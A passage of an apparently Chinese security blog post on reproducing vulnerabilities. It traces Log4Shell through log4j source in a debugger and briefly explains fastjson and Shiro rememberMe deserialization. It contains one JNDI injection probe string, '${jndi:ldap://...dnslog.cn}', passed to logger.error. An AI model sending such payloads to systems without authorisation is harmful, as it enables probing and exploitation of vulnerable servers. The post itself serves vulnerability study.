+<h3 id="log4j原理研究"><a href="#log4j原理研究" class="headerlink" title="log4j原理研究"></a>log4j原理研究</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这是他的jar包,注意导入这个的时候做好要一个干净的maven项目,不然有可能导入其他版本的</p>
+<p>导致这个漏洞主要是因为log4j会处理<code>$&#123;&#125;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://vj40sh.dnslog.cn&#125;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>我们使用error方法来测试,并跟踪传入的数据,使用的工具主要是idea</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.config</span>.LoggerConfig<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j-1.png" srcset="/img/loading.gif" lazyload alt="image-20220312165641262"></p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311642619.png" srcset="/img/loading.gif" lazyload alt="image-20220312165727944"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.config</span>.AppenderControl<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j-3.png" srcset="/img/loading.gif" lazyload alt="image-20220312165904294"></p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j_4.png" srcset="/img/loading.gif" lazyload alt="image-20220312170058354"></p>
+<p>可以看到这个toText里面有一个Serializer2感觉很敏感,进入这个函数,进入之后继续跟进</p>
+<p>之后在这个函数才是真正对字符串进行操作的函数,一共有11个,我们重点关注第9个</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311644720.png" srcset="/img/loading.gif" lazyload alt="image-20220312170444068"></p>
+<p>可以看出这里对<code>$&#123;&#125;</code>进行了分析</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311649735.png" srcset="/img/loading.gif" lazyload alt="image-20220312170953055"></p>
+<p>由于下面的递归层数太多了所以直接跳到StrSubstitutor.resolveVariable(可以直接在这里打断点)</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653024.png" srcset="/img/loading.gif" lazyload alt="image-20220312171606019"></p>
+<p>然后进入lookup函数</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653792.png" srcset="/img/loading.gif" lazyload alt="image-20220312172253870"></p>
+<p>这里显示了所有的类型</p>
+<p>并且JndiLookup.lookup是真正的触发函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, <span class="hljs-keyword">final</span> String key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jndiName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.convertJndiName(key);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">JndiManager</span> <span class="hljs-variable">jndiManager</span> <span class="hljs-operator">=</span> JndiManager.getDefaultManager();<br>            <span class="hljs-type">Throwable</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            String var6;<br>            <span class="hljs-keyword">try</span> &#123;<br>                var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var16) &#123;<br>                var5 = var16;<br>                <span class="hljs-keyword">throw</span> var16;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (jndiManager != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (var5 != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            jndiManager.close();<br>                        &#125; <span class="hljs-keyword">catch</span> (Throwable var15) &#123;<br>                            var5.addSuppressed(var15);<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        jndiManager.close();<br>                    &#125;<br>                &#125;<br><br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var6;<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var18) &#123;<br>            LOGGER.warn(LOOKUP, <span class="hljs-string">&quot;Error looking up JNDI resource [&#123;&#125;].&quot;</span>, jndiName, var18);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>由于别人写的挺好那么我就不造轮子了</p>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</a></p>
+<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>是用于JSON和Java Object之间相互转化的类</p>
+<p>jndi(Java Naming and Directory Interface)所包含支持的服务</p>
+<blockquote>
+<p>LDAP （Lightweight Directory Access Protocol） 轻量级目录访问协议</p>
+<p>CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务</p>
+<p>RMI（Java Remote Method Invocation）JAVA远程远程方法调用注册</p>
+<p>DNS（Domain Name Service）域名服务</p>
+</blockquote>
+<p>根据@type来反序列化文件，导致加载了本地的其他类从而执行恶意代码</p>
+<p>com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;DefaultJSONParser.java的parseObject函数中发生的</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653050.jpeg" srcset="/img/loading.gif" lazyload alt="image-20220313153402012"></p>
+<p>这里根据具体的类型来使用deserializer类来进行反序列化，之后序列化并return</p>
+<p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311654590.jpeg" srcset="/img/loading.gif" lazyload alt="image-20220313153539964"></p>
+<p>不过会经过com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;ParserConfig.java的白名单，黑名单检测而ParserConfig函数则put了很多默认的类</p>
+<h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8/">#安全</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E/">#漏洞</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>漏洞复现</div>
+      <div>http://example.com/2022/02/21/漏洞复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年2月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/02/Kerberos/" title="Kerberos">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kerberos</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/06/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/" title="渗透实践">
+                        <span class="hidden-mobile">渗透实践</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.0/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"mPhovhHHyKg2LpAcQhS6tjAw-gzGzoHsz","appKey":"6W2dsSWjVfMOOkXrNbFWOSDN","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://mphovhhh.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
